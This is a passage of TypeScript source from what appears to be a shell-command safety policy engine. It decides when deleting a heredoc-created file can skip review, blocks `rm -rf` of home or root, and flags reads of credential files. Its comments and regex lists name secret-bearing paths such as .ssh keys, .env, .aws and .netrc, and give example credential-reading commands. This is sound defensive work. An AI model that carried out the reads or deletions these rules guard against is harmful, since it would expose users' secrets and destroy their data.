//   cat > fn-probe.ts <<'EOF' … EOF
//   npx tsx fn-probe.ts; rm -f fn-probe.ts          ← review-rm prompts here
// The file was created in this very command and never existed before, so the
// delete protects nothing. isRmCreatedInCommandCleanup returns true for exactly
// that shape; the orchestrator then skips ONLY the `review-rm` advisory for this
// command (block-rm-rf-home, allow-rm-safe-paths, and USER rules still apply —
// see policy/index.ts). Everything else keeps reviewing.

const stripDotSlash = (p: string): string => p.replace(/^\.\//, '');

// Sensitive filenames never qualify — even if written this command — so
// `cat > .env <<EOF…; rm .env` still reviews (closes overwrite-then-delete for
// the highest-value targets). A BACKSTOP, not an exhaustive list: it guards the
// files where an already-ungated overwrite plus a silent delete would be worst
// (secrets/keys/vcs). Ordinary source files rely on the overwrite being the real
// (already-ungated) damage — deleting the emptied file adds little.
// NOTE: intentionally a small local list, not dlp's SENSITIVE_PATH_PATTERNS —
// that set targets credential READS by absolute path; this guards relative
// in-cwd cleanup DELETES. Keep the credential-extension overlap roughly aligned.
function isSensitiveCleanupName(p: string): boolean {
  const base = p.replace(/^.*[\\/]/, '');
  return (
    /^\.env(\.|$)/i.test(base) ||
    /(?:^|[\\/])\.(?:ssh|aws|gnupg|git)(?:[\\/]|$)/i.test(p) ||
    /\.(?:pem|key|p12|pfx|crt)$/i.test(base) ||
    /^\.?(?:netrc|npmrc|pgpass|htpasswd)$/i.test(base) ||
    /^id_(?:rsa|dsa|ecdsa|ed25519)/i.test(base) ||
    /credential/i.test(p) ||
    /secret/i.test(base)
  );
}

// A same-command creation can waive review only for a relative, in-cwd, non-glob,
// non-sensitive target. Absolute / home / `..` / glob / brace never qualify.
function isWaivableCleanupTarget(p: string): boolean {
  if (/^[/~]/.test(p) || /^\$/.test(p)) return false;
  if (/(?:^|[\\/])\.\.(?:[\\/]|$)/.test(p)) return false;
  if (/[*?[{]/.test(p)) return false;
  if (isSensitiveCleanupName(p)) return false;
  return true;
}

// mvdan-sh exposes redirect operators only as opaque numeric enums (no named
// exports). Derive the ones we need ONCE from known samples so this survives a
// library version bump; on any failure the sets stay empty → no file is ever
// classed as "created" → the waiver never fires (safe degrade to review).
function deriveRedirOp(sample: string): number {
  try {
    const f = sharedParser.Parse(sample, 'cmd');
    let op = -1;
    syntax.Walk(f, (node: unknown) => {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = node as any;
      if (n && syntax.NodeType(n) === 'Redirect' && op < 0) op = n.Op;
      return true;
    });
    return op;
  } catch {
    return -1;
  }
}
// `>` truncates/creates a file; `<<` / `<<-` are heredocs. Note: an EMPTY heredoc
// has a null `.Hdoc`, so detect heredocs by OPERATOR, not by heredoc-body presence.
// `>>` (append) is intentionally NOT here — append PRESERVES a pre-existing file's
// content, so `cat >> victim <<E; rm victim` would delete an intact file (same
// class as touch). Only a `>` truncate counts.
// The `< file` redirect ONLY — the form whose Word is a PATH.
//
// Deliberately not redirStdinOps(): that set bundles heredoc and herestring,
// whose Word is inline CONTENT rather than a path, and matching them here would
// read the document body as a filename. Two sets with different meanings beat
// one set every caller has to remember to narrow.
//
// Writes (`>`, `>>`, `2>`) are excluded by decision, not oversight. Gating a
// write to a credential path is worth doing and is a SCOPE question; this is a
// bug fix for a read the mechanism could not see.
const REDIR_STDIN_FILE_OPS = new Set<number>([deriveRedirOp('cat < f')].filter((op) => op >= 0));

const REDIR_TRUNCATE_OPS = new Set<number>([deriveRedirOp('>_f')]);
const REDIR_HEREDOC_OPS = new Set<number>([
  deriveRedirOp('cat <<X\nX'),
  deriveRedirOp('cat <<-X\nX'),
]);

// Files written with content in this command via a heredoc (`cat > f <<EOF`).
// A "created" file is the target of a `>` truncate redirect on the DEFAULT fd
// (stdout, `r.N == null`) belonging to a statement that also carries a heredoc.
// Deliberately narrow — this is the founder's actual probe pattern. Excluded:
//  - `>>` append (op not in REDIR_TRUNCATE_OPS) — preserves pre-existing content;
//  - `2>` / `1>` (explicit fd, `r.N != null`) — a stderr/fd sink, not the heredoc
//    content file, and a redirect target that may pre-exist;
//  - a bare `> f` / `echo … > f` with no heredoc, and `touch`/`tee`.
// RESIDUAL (accepted, documented): a `>` truncate of a PRE-EXISTING file
// (`cat > existing <<E…; rm existing`) still counts — the check is pure (no fs)
// and can't tell new from overwritten. That truncate destroys the content and is
// itself already ungated, so the waiver only changes "left empty" → "removed".
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function collectSameCommandCreations(f: any): Set<string> {
  const created = new Set<string>();
  try {
    // Only UNCONDITIONAL top-level simple commands count. Iterating `f.Stmts` and
    // requiring `stmt.Cmd` to be a CallExpr is a safe allowlist: a create nested
    // in a `&&`/`||` (BinaryCmd), if/for/while/case, or function body is control-
    // flow-dependent — it may never run at runtime, which would leave the rm
    // target an INTACT pre-existing file (a data-loss bypass). This deliberately
    // also misses subshell / `&&`-left-operand creates — those just fall through
    // to review; it never over-counts a create a branch could skip.
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const stmts: any[] = Array.isArray(f?.Stmts) ? f.Stmts : [];
    for (const stmt of stmts) {
      if (!stmt || !stmt.Cmd || syntax.NodeType(stmt.Cmd) !== 'CallExpr') continue;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const redirs: any[] = stmt.Redirs || [];
      if (!redirs.some((r) => r && REDIR_HEREDOC_OPS.has(r.Op))) continue;
      for (const r of redirs) {
        if (r && REDIR_TRUNCATE_OPS.has(r.Op) && r.N == null) {
          const w = resolveWordLiteral(r.Word);
          if (w) created.add(stripDotSlash(w));
        }
      }
    }
  } catch {
    return created;
  }
  return created;
}

/**
 * True when EVERY `rm` in the command targets only files this same command just
 * wrote via a heredoc and that are safe to waive (relative, in-cwd, non-glob,
 * non-sensitive). A dynamic/unresolved target, a non-created sibling, or a
 * sensitive/out-of-cwd target ⇒ false (⇒ review-rm still fires). Pure.
 */
export function isRmCreatedInCommandCleanup(command: string): boolean {
  if (!/\brm\b/.test(command)) return false;
  const f = parseShared(command);
  if (f === PARSE_FAIL) return false;
  const created = collectSameCommandCreations(f);
  if (created.size === 0) return false;

  let sawRm = false;
  let ok = true;
  try {
    syntax.Walk(f, (node: unknown) => {
      if (!node || !ok) return false;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = node as any;
      if (syntax.NodeType(n) !== 'CallExpr') return true;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const args: any[] = n.Args || [];
      const name = (resolveWordLiteral(args[0]) ?? '').toLowerCase();
      if (name !== 'rm') return true;
      sawRm = true;
      const { paths, hasUnresolved } = extractLiteralArgs(n);
      // A target we could not fully resolve → can't prove this rm only removes
      // what this command created.
      //
      // This used to be inferred by COUNTING dropped arguments
      // (`args.length - 1 > flags.length + paths.length`). Once words stop
      // being dropped that count is always zero, and the guard would silently
      // stop firing — it would then fail only by accident, because the sentinel
      // text is absent from `created`. A guard that works by accident is a
      // guard that stops working silently, so the signal is now stated by the
      // extractor rather than derived from what it discarded.
      //
      // Strictly stronger than the count: `rm -f out$N.log` produced ONE path
      // and satisfied the old comparison; it sets hasUnresolved.
      if (hasUnresolved) {
        ok = false;
        return false;
      }
      if (paths.length === 0) {
        ok = false;
        return false;
      }
      for (const p of paths) {
        const np = stripDotSlash(p);
        if (!created.has(np) || !isWaivableCleanupTarget(np)) {
          ok = false;
          return false;
        }
      }
      return true;
    });
  } catch {
    return false;
  }
  return sawRm && ok;
}

function analyzeFsOperationImpl(command: string): FsOpVerdict | null {
  const f = parseShared(command);
  if (f === PARSE_FAIL) return null;
  let result: FsOpVerdict | null = null;
  try {
    syntax.Walk(f, (node: unknown) => {
      if (!node || result) return false;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = node as any;
      // A `< file` redirect is a READ, and its path lives on the enclosing
      // Stmt — never in Args — so the CallExpr branch below can never see it.
      // The shell delivers the file's bytes to the process before the program
      // runs, so the COMMAND NAME is the wrong thing to condition on: this
      // fires for `md5sum < ~/.ssh/id_rsa` as much as for `cat < …`.
      if (syntax.NodeType(n) === 'Stmt') {
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        for (const r of (n.Redirs || []) as any[]) {
          if (!r || !REDIR_STDIN_FILE_OPS.has(r.Op)) continue;
          const p = resolveWordParts(r.Word).value;
          if (!p) continue;
          for (const sp of SENSITIVE_PATH_RULES) {
            if (sp.match(p)) {
              result = {
                ruleName: sp.rule,
                verdict: sp.verdict ?? 'block',
                reason: sp.reason,
                path: displayPath(p),
              };
              return false;
            }
          }
        }
        return true;
      }
      if (syntax.NodeType(n) !== 'CallExpr') return true;
      const { name, flags, paths } = extractLiteralArgs(n);
      if (!name) return true;

      // rm with -r and -f (any combination, e.g. -rf, -fr, -r -f)
      if (name === 'rm') {
        const flagStr = flags.join('').toLowerCase();
        const hasR = /[r]/.test(flagStr) || flags.includes('--recursive');
        const hasF = /[f]/.test(flagStr) || flags.includes('--force');
        if (hasR && hasF) {
          for (const p of paths) {
            if (isProtectedHomePath(p)) {
              result = {
                ruleName: 'block-rm-rf-home',
                verdict: 'block',
                reason: 'Recursive delete of home directory is irreversible',
                path: displayPath(p),
              };
              return false;
            }
            // /
            if (p === '/' || /^\/+$/.test(p)) {
              result = {
                ruleName: 'block-rm-rf-home',
                verdict: 'block',
                reason: 'Recursive delete of root is catastrophic',
                path: displayPath(p),
              };
              return false;
            }
          }
        }
      }

      // Read tools — `cat ~/.ssh/id_rsa`, etc.
      if (FS_READ_TOOLS.has(name)) {
        for (const p of paths) {
          for (const sp of SENSITIVE_PATH_RULES) {
            if (sp.match(p)) {
              result = {
                ruleName: sp.rule,
                verdict: sp.verdict ?? 'block',
                reason: sp.reason,
                path: displayPath(p),
              };
              return false;
            }
          }
        }
      }

      return true;
    });
    return result;
  } catch {
    return null;
  }
}

export interface ShellCommandAnalysis {
  /** First word of every CallExpr — the command names invoked. */
  actions: string[];
  /** Non-flag positional arguments — likely file paths. */
  paths: string[];
  /** Lowercased token bag, expanded to include split path segments and de-flagged variants. */
  allTokens: string[];
}

/**
 * Tokenizes a shell command into actions / paths / all-tokens for policy
 * matching. Tries the AST first; if mvdan-sh fails to parse, falls back to
 * a permissive regex tokenizer so dangerous-word checks still see something.
 */
export function analyzeShellCommand(command: string): ShellCommandAnalysis {
  const actions: string[] = [];
  const paths: string[] = [];
  const allTokens: string[] = [];

  const addToken = (token: string) => {
    const lower = token.toLowerCase();
    allTokens.push(lower);
    if (lower.includes('/')) allTokens.push(...lower.split('/').filter(Boolean));
    if (lower.startsWith('-')) allTokens.push(lower.replace(/^-+/, ''));
  };

  try {
    const f = sharedParser.Parse(command, 'cmd');
    syntax.Walk(f, (node: unknown) => {
      if (!node) return false;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = node as any;
      if (syntax.NodeType(n) !== 'CallExpr') return true;

      // Collect literal text from each word argument (skip pure flag tokens).
      // Unescape Lit values so `r\m` is treated as `rm` (shell backslash-escaping).
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const wordValues: string[] = (n.Args || [])
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        .map((arg: any) => {
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          return (
            (arg.Parts || [])
              // eslint-disable-next-line @typescript-eslint/no-explicit-any
              .map((p: any) => (p.Value ?? '').replace(/\\(.)/g, '$1'))
              .join('')
          );
        })
        .filter((s: string) => s.length > 0);

      if (wordValues.length > 0) {
        const cmd = wordValues[0].toLowerCase();
        if (!actions.includes(cmd)) actions.push(cmd);
        wordValues.forEach((w: string) => addToken(w));
        wordValues.slice(1).forEach((w: string) => {
          if (!w.startsWith('-')) paths.push(w);
        });
      }
      return true;
    });
  } catch {
    // AST parse failed — fallback to regex tokenizer
  }

  if (allTokens.length === 0) {
    const normalized = command.replace(/\\(.)/g, '$1');
    const sanitized = normalized.replace(/["'<>]/g, ' ');
    const segments = sanitized.split(/[|;&]|\$\(|\)|`/);
    segments.forEach((segment) => {
      const tokens = segment.trim().split(/\s+/).filter(Boolean);
      if (tokens.length > 0) {
        const action = tokens[0].toLowerCase();
        if (!actions.includes(action)) actions.push(action);
        tokens.forEach((t) => {
          addToken(t);
          if (t !== tokens[0] && !t.startsWith('-')) {
            if (!paths.includes(t)) paths.push(t);
          }
        });
      }
    });
  }
  return { actions, paths, allTokens };
}
